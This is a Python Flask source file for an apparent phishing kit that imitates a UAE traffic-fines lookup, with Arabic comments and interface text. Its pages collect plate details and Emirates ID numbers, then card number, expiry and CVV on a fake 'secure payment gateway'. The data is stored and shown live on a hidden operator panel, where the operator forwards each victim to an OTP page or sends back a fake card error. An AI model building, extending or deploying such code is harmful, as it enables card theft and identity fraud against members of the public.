import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# مخزن البيانات والحالة (Live Database)
# status: waiting, approved, rejected
db = {
    "captured": [], 
    "current_status": "waiting",
    "error_msg": "",
    "next_url": ""
}

# --- 1. الصفحة الرئيسية (ضبط الأزرار) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html { margin: 0; padding: 0; width: 100%; }
    .page-container { position: relative; width: 100%; }
    .page-container img { width: 100%; display: block; }
    .sticky-header { position: sticky; top: 0; z-index: 1000; background: white; width: 100%; }
    /* إحداثيات الأزرار الشفافة */
    .overlay-btn { position: absolute; left: 5%; width: 90%; height: 7%; background: rgba(0,0,0,0); cursor: pointer; border: none; }
</style>
</head>
<body>
    <div class="sticky-header"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg"></div>
    <div class="page-container">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <button class="overlay-btn" style="top: 38%;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <button class="overlay-btn" style="top: 55%;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (كاملة) ---
SEARCH_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background:#f4f4f4; font-family:sans-serif; margin:0; }
    .card { background:white; max-width:600px; margin:20px auto; border-radius:8px; box-shadow:0 4px 15px rgba(0,0,0,0.1); overflow:hidden; }
    .card-title { background:#b0914f; color:white; padding:20px; text-align:center; font-weight:bold; }
    .content { padding:25px; }
    .form-group { margin-bottom:15px; }
    label { display:block; margin-bottom:5px; font-weight:bold; }
    select, input { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; }
    .plate-grid { display:grid; grid-template-columns: 1fr 1fr 2fr; gap:10px; }
    .btn-search { background:#b0914f; color:white; border:none; padding:18px; width:100%; border-radius:4px; font-weight:bold; cursor:pointer; font-size:18px; }
</style></head>
<body>
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%;">
    <div class="card">
        <div class="card-title">نظام الاستعلام عن المخالفات</div>
        <form action="/report" method="POST" class="content">
            <div class="form-group"><label>الإمارة:</label><select name="source"><option>أبوظبي</option><option>دبي</option><option>الشارقة</option></select></div>
            <div class="form-group"><label>بيانات اللوحة:</label>
                <div class="plate-grid">
                    <select name="cat"><option>خصوصي</option><option>نقل عام</option><option>تجاري</option></select>
                    <input type="text" name="code" placeholder="الرمز">
                    <input type="text" name="num" placeholder="الرقم">
                </div>
            </div>
            <div class="form-group"><label>رقم الهوية:</label><input type="text" name="eid" required></div>
            <button type="submit" class="btn-search">بحث عن المخالفات</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. صفحة الدفع الذكية (كاشف الفيزا) ---
CARD_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background:#f4f4f4; font-family:sans-serif; }
    .pay-box { max-width:400px; margin:30px auto; background:white; border-radius:15px; border:1px solid #b0914f; overflow:hidden; }
    .pay-head { background:#b0914f; color:white; padding:20px; text-align:center; }
    .pay-body { padding:25px; }
    .input-group { position:relative; margin-bottom:15px; }
    input { width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }
    .card-logo { position:absolute; left:10px; top:50%; transform:translateY(-50%); width:40px; display:none; }
    .btn { background:#b0914f; color:white; width:100%; padding:15px; border:none; border-radius:8px; font-weight:bold; cursor:pointer; }
</style></head>
<body>
    <div class="pay-box">
        <div class="pay-head"><h3>بوابة الدفع الآمنة</h3></div>
        <form action="/capture-card" method="POST" class="pay-body">
            <div class="input-group">
                <input type="text" id="cardNum" name="card" placeholder="رقم البطاقة" maxlength="19" required>
                <img id="logo" class="card-logo" src="">
            </div>
            <div style="display:flex; gap:10px;">
                <input type="text" id="exp" name="exp" placeholder="MM/YY" maxlength="5" required>
                <input type="text" name="cvv" placeholder="CVV" maxlength="3" required>
            </div>
            <button type="submit" class="btn">تأكيد السداد</button>
        </form>
    </div>
    <script>
        const cardInp = document.getElementById('cardNum');
        const logo = document.getElementById('logo');
        cardInp.addEventListener('input', (e) => {
            let v = e.target.value.replace(/\s/g, '');
            if(v.startsWith('4')) { logo.src="https://img.icons8.com/color/48/visa.png"; logo.style.display="block"; }
            else if(v.startsWith('5')) { logo.src="https://img.icons8.com/color/48/mastercard.png"; logo.style.display="block"; }
            else { logo.style.display="none"; }
            e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
        });
    </script>
</body>
</html>
"""

# --- 4. صفحة الانتظار (العميل بيفضل هنا لحد ما أنت توافق) ---
WAIT_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8">
<script>
    function check() {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'approved') { location.href = d.next; }
            else if(d.status === 'rejected') { alert(d.msg); location.href='/card-info'; }
        });
    }
    setInterval(check, 3000);
</script>
</head>
<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
    <div style="border:8px solid #f3f3f3; border-top:8px solid #b0914f; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:auto;"></div>
    <h2>جاري التحقق من البيانات...</h2>
    <p>يرجى عدم إغلاق الصفحة</p>
    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
</body>
</html>
"""

# --- 5. لوحة التحكم (موافقة / رفض) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar">
<head><meta charset="UTF-8"><style>
    body { background:#111; color:white; font-family:sans-serif; padding:20px; }
    .card { background:#222; padding:15px; border-radius:10px; margin-bottom:10px; border:1px solid #b0914f; }
    button { padding:10px; margin:5px; cursor:pointer; font-weight:bold; }
</style></head>
<body>
    <h1>لوحة تحكم حسن 🚀</h1>
    <div id="logs"></div>
    <script>
        function load() {
            fetch('/get-data').then(r => r.json()).then(d => {
                let h = '';
                d.captured.forEach((x, i) => {
                    h += `<div class="card">
                        <p>${JSON.stringify(x)}</p>
                        <button style="background:green; color:white;" onclick="act('approved','/otp-page')">موافق (عديه للـ OTP)</button>
                        <button style="background:red; color:white;" onclick="act('rejected','','بيانات البطاقة خاطئة')">رفض (رسالة خطأ)</button>
                    </div>`;
                });
                document.getElementById('logs').innerHTML = h;
            });
        }
        function act(s, n, m='') { fetch('/set-status', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({status:s, next:n, msg:m})}); }
        setInterval(load, 3000);
    </script>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/report', methods=['POST'])
def report(): return render_template_string("...صفحة التقرير...") # تودي لـ /card-info

@app.route('/card-info')
def card_info(): return render_template_string(CARD_HTML)

@app.route('/capture-card', methods=['POST'])
def cap_card():
    db['captured'].insert(0, request.form.to_dict())
    db['current_status'] = 'waiting'
    return render_template_string(WAIT_HTML)

@app.route('/check-status')
def check_status(): return jsonify({"status": db['current_status'], "next": db['next_url'], "msg": db['error_msg']})

@app.route('/set-status', methods=['POST'])
def set_status():
    r = request.json
    db['current_status'], db['next_url'], db['error_msg'] = r['status'], r['next'], r['msg']
    return "OK"

@app.route('/get-data')
def get_data(): return jsonify({"captured": db['captured']})

@app.route('/h-admin')
def admin(): return render_template_string(ADMIN_HTML)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
